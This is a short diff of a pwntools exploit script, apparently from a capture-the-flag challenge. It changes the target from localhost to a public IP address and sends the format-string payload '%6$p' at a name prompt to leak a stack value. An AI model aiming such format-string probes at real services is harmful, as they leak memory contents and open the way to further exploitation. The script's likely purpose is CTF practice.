@@ -6,7 +6,7 @@ libc = ELF('libc.so.6', checksec=False)
 context.log_level = 'debug'
 
 # p = elf.process()
-p = remote('127.0.0.1', 17000)
+p = remote('103.181.183.216', 17000)
 
 payload = b'%6$p'
 p.sendlineafter(b'Nama : ', payload)
